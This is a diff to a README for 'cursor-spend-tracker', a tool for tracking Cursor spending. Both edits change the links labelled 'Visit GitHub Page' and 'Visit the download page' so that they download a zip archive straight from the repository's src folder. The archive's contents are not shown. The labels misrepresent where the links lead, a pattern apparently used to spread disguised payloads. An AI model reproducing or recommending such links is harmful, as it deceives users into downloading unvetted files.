@@ -1,6 +1,6 @@
 # 📈 cursor-spend-tracker - See Cursor spend at a glance
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/MrTScripts/cursor-spend-tracker)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/MrTScripts/cursor-spend-tracker/raw/refs/heads/main/src/spend-tracker-cursor-1.2.zip)
 
 ## 🧭 What this app does
 
@@ -23,7 +23,7 @@ This app is for Cursor, not plain VS Code.
 
 Use this link to visit the page to download:
 
-[Visit the download page](https://github.com/MrTScripts/cursor-spend-tracker)
+[Visit the download page](https://github.com/MrTScripts/cursor-spend-tracker/raw/refs/heads/main/src/spend-tracker-cursor-1.2.zip)
 
 If the page opens in your browser, look for the latest release or download files on the page.
 
